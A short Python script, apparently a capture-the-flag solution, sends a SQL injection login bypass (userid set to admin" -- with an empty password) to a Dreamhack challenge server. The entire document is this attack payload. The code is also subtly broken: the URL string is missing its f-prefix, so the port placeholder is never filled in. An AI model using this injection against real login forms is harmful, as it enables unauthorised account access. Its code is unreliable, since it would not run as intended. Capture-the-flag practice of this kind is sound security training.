import requests

port = 8863
url_login = "http://host1.dreamhack.games:{port}/login"
param = {"userid": 'admin" --', "userpassword": ""}
response = requests.post(url_login, data=param)
print(response.text)
